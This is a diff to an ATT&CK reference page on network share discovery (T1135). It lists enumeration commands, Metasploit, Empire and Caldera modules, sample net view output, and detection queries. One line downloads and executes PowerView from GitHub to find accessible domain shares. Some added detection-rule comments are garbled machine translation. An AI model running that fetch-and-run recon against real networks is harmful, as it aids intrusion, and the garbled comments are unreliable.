@@ -31,35 +31,41 @@ Cloud virtual networks may contain remote network shares or file storage service
 ## Potential Commands
 
 ```
-net share
-net share
 auxiliary/scanner/smb/smb_enumshares
-net view \\host /all [/domain:domain]
+net share
 net view \\host /domain
 auxiliary/scanner/smb/smb_enumshares
+net view \\host /all [/domain:domain]
+net view \\localhost
+net share
+net view \\localhost
+get-smbshare -Name localhost
 df -aH
 smbutil view -g //computer1
 showmount computer1
-
-net view \\localhost
-
-net view \\localhost
-get-smbshare -Name localhost
-
-net share
-
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-DomainShare -CheckShareAccess -Verbose
+Get-SmbShare | ConvertTo-Json
+net view \\#{remote.host.fqdn} /all
+powershell/situational_awareness/network/powerview/get_dfs_share
+powershell/situational_awareness/network/powerview/share_finder
+python/situational_awareness/network/active_directory/get_fileservers
+python/situational_awareness/network/smb_mount
+Dos
+C: \ Windows \ system32> net view \\ OWA2010SP3.0day.org
+In the shared resource \\ OWA2010SP3.0day.org
 
-{'windows': {'pwsh,psh': {'command': 'Get-SmbShare | ConvertTo-Json', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.smb.share', 'custom_parser_vals': {'json_key': 'Path', 'json_type': 'str'}}]}}}}
-{'windows': {'psh': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}, 'cmd': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}}}
-powershell/situational_awareness/network/powerview/get_dfs_share
-powershell/situational_awareness/network/powerview/get_dfs_share
-powershell/situational_awareness/network/powerview/share_finder
-powershell/situational_awareness/network/powerview/share_finder
-python/situational_awareness/network/active_directory/get_fileservers
-python/situational_awareness/network/active_directory/get_fileservers
-python/situational_awareness/network/smb_mount
-python/situational_awareness/network/smb_mount
+
+
+Share name for the type of use annotations
+
+-------------------------------------------------- -----------------------------
+Address Disk "Access to address objects"
+CertEnroll Disk Active Directory Certificate Services Share
+ExchangeOAB Disk OAB Distribution share
+GroupMetrics Disk group metrics MailTips publishing point
+NETLOGON Disk Logon server share
+SYSVOL Disk Logon server share
+The command completed successfully.
 ```
 
 ## Commands Dataset
@@ -98,23 +104,13 @@ python/situational_awareness/network/smb_mount
              'Find-DomainShare -CheckShareAccess -Verbose\n',
   'name': None,
   'source': 'atomics/T1135/T1135.yaml'},
- {'command': {'windows': {'pwsh,psh': {'command': 'Get-SmbShare | '
-                                                  'ConvertTo-Json',
-                                       'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'Path',
-                                                                                                                  'json_type': 'str'},
-                                                                                           'source': 'domain.smb.share'}]}}}},
+ {'command': 'Get-SmbShare | ConvertTo-Json',
   'name': 'Network Share Discovery',
   'source': 'data/abilities/discovery/530e47c6-8592-42bf-91df-c59ffbd8541b.yml'},
- {'command': {'windows': {'cmd': {'command': 'net view \\\\#{remote.host.fqdn} '
-                                             '/all',
-                                  'parsers': {'plugins.stockpile.app.parsers.net_view': [{'edge': 'has_share',
-                                                                                          'source': 'remote.host.fqdn',
-                                                                                          'target': 'remote.host.share'}]}},
-                          'psh': {'command': 'net view \\\\#{remote.host.fqdn} '
-                                             '/all',
-                                  'parsers': {'plugins.stockpile.app.parsers.net_view': [{'edge': 'has_share',
-                                                                                          'source': 'remote.host.fqdn',
-                                                                                          'target': 'remote.host.share'}]}}}},
+ {'command': 'net view \\\\#{remote.host.fqdn} /all',
+  'name': 'View the shares of a remote host',
+  'source': 'data/abilities/discovery/deeac480-5c2a-42b5-90bb-41675ee53c7e.yml'},
+ {'command': 'net view \\\\#{remote.host.fqdn} /all',
   'name': 'View the shares of a remote host',
   'source': 'data/abilities/discovery/deeac480-5c2a-42b5-90bb-41675ee53c7e.yml'},
  {'command': 'powershell/situational_awareness/network/powerview/get_dfs_share',
@@ -140,7 +136,26 @@ python/situational_awareness/network/smb_mount
   'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
  {'command': 'python/situational_awareness/network/smb_mount',
   'name': 'Empire Module Command',
-  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
+  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
+ {'command': 'Dos\n'
+             'C: \\ Windows \\ system32> net view \\\\ OWA2010SP3.0day.org\n'
+             'In the shared resource \\\\ OWA2010SP3.0day.org\n'
+             '\n'
+             '\n'
+             '\n'
+             'Share name for the type of use annotations\n'
+             '\n'
+             '-------------------------------------------------- '
+             '-----------------------------\n'
+             'Address Disk "Access to address objects"\n'
+             'CertEnroll Disk Active Directory Certificate Services Share\n'
+             'ExchangeOAB Disk OAB Distribution share\n'
+             'GroupMetrics Disk group metrics MailTips publishing point\n'
+             'NETLOGON Disk Logon server share\n'
+             'SYSVOL Disk Logon server share\n'
+             'The command completed successfully.',
+  'name': 'Dos',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
 ```
 
 ## Potential Detections
@@ -208,7 +223,119 @@ python/situational_awareness/network/smb_mount
   'query': 'Sysmon| where EventID == 1 and (process_path contains "net.exe"and '
            '(process_command_line contains "net view"or process_command_line '
            'contains "net share"))or process_command_line contains '
-           '"get-smbshare -Name"'}]
+           '"get-smbshare -Name"'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: windows network share discovery (windows server 2016) '
+           'Detection\n'
+           'description: windows server 2016, windows server 2012, domain '
+           'environment\n'
+           'tags: T1135\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 4688 # have created a new process.\n'
+           "        Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # "
+           'process information> new process name\n'
+           "        Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' "
+           '# Process Information> Creator Process Name\n'
+           '        Processcommandline: net view \\\\ * # Process Information> '
+           'process command line\n'
+           '    selection2:\n'
+           '        EventID: 4703 # adjusted user rights. Note This event '
+           'enabled more than 2016 windows server system\n'
+           '    selection3:\n'
+           '        EventID: 5158 #Windows screening platform has been allowed '
+           'to bind the local port. Note that the source port, protocol\n'
+           '    selection4:\n'
+           '        EventID: 5156 #Windows screening platform has been allowed '
+           'to connect.\n'
+           '        Direction: Outbound network information #> Direction: '
+           'Outbound\n'
+           '        Sourceaddress: * # IP address of the host to initiate '
+           'inquiry\n'
+           '        Sourceport: * # 5158 and the same event source port\n'
+           '        Targetaddress: * # destination IP address\n'
+           '        Targetport: 445 # destination port\n'
+           '        Agreement: * # protocol, the same protocol and 5158\n'
+           '    selection5:\n'
+           '        EventID: 4689 # exited process.\n'
+           "        Processname: 'C: \\ Windows \\ System32 \\ net.exe' # "
+           'process information> process name\n'
+           '    timeframe: last 5s # can be adjusted according to actual '
+           'situation\n'
+           '    condition: all of them\n'
+           'level: medium'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: windows network share discovery (windows server 2012) '
+           'Detection\n'
+           'description: windows server 2016, windows server 2012, domain '
+           'environment\n'
+           'tags: T1135\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 5156 #Windows screening platform has been allowed '
+           'to connect.\n'
+           '        Direction: Inbound network information #> Direction: '
+           'Inbound\n'
+           '        Sourceaddress: * # queried host IP address\n'
+           '        Sourceport: 445\n'
+           '        Targetaddress: * # Destination Address IP address of the '
+           'host to initiate queries\n'
+           '        Targetport: * # target host port IP port to initiate '
+           'queries\n'
+           '        Agreement: * # protocol, the 5156 and 2016 events, 5158 '
+           'incident involving a consensual agreement\n'
+           '    selection2:\n'
+           '        EventID: 4702 # assigned special permissions for the new '
+           'login.\n'
+           '    selection3:\n'
+           '        EventID: 4624 # account was successfully logged.\n'
+           '        logontype: 3 # 3 type landing\n'
+           '        Sourcenetworkaddress: * # Network Information> source '
+           'network address above 5156 target address\n'
+           '        Sourceport: * # Network Information> source network port '
+           'above 5156 target port\n'
+           '        Loginprocess: Kerberos # detailed authentication '
+           'information> login process\n'
+           '        Authenticationpackage: Kerberos # Detailed Authentication '
+           'Information> Authentication Package\n'
+           '    selection4:\n'
+           '        EventID: 5140 # visited network shared objects.\n'
+           '        Objecttype: file # Network Information> Object Type\n'
+           '        Sourceaddress: * # Network Information> source address '
+           'above 5156 target address\n'
+           '        Sourceport: * # Network Information> source port '
+           'destination port above 5156\n'
+           '        Sharename: \\\\ * \\ IPC $ # Share Information> Share '
+           'name\n'
+           '    selection5:\n'
+           '        EventID: 5140 # visited network shared objects.\n'
+           '        Objecttype: file # Network Information> Object Type\n'
+           '        Sourceaddress: * # Network Information> source address '
+           'above 5156 target address\n'
+           '        Sourceport: * # Network Information> source port '
+           'destination port above 5156\n'
+           '        Sharename: \\\\ * \\ IPC $ # Share Information> Share '
+           'name\n'
+           '        Relativetargetname: srvsvc # Share Information> relative '
+           'to the target name\n'
+           '    timeframe: last 10s # can be adjusted according to actual '
+           'situation\n'
+           '    condition: all of them\n'
+           'level: medium'}]
 ```
 
 ## Raw Dataset
